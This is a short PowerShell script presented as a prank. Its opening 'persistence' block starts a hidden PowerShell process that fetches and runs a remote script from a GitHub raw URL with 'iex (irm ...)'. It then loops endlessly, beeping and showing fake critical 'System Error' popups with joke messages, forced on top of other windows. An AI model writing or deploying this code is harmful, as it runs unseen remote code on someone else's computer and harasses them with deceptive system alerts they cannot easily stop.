# --- BACKGROUND PERSISTENCE LOGIC ---
if ($null -eq $env:IS_BACKGROUND) {
    $command = "iex (irm https://raw.githubusercontent.com/rozeen-shrestha/prank/refs/heads/main/roz.ps1)"
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -Command `"$command`"" -WindowStyle Hidden
    $env:IS_BACKGROUND = 1
    exit
}

# --- PRANK LOGIC ---
$errorMessages = @(
    "Critical Error: Keyboard requires cleaning.",
    "System Error: Monitor detects poor posture.",
    "Error: Mouse movement detected but no work.",
    "Warning: Desk chair detects laziness.",
    "Error: 404 Motivation not found."
)

# Load the Forms assembly for ServiceNotification
Add-Type -AssemblyName System.Windows.Forms

while ($true) {
    [System.Console]::Beep(500, 300)
    $msg = $errorMessages | Get-Random
    
    # Use ServiceNotification to force the popup on top of hidden processes
    [System.Windows.Forms.MessageBox]::Show($msg, "System Error", 
        [System.Windows.Forms.MessageBoxButtons]::OK, 
        [System.Windows.Forms.MessageBoxIcon]::Error,
        [System.Windows.Forms.MessageBoxDefaultButton]::Button1,
        [System.Windows.Forms.MessageBoxOptions]::ServiceNotification)
    
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
}
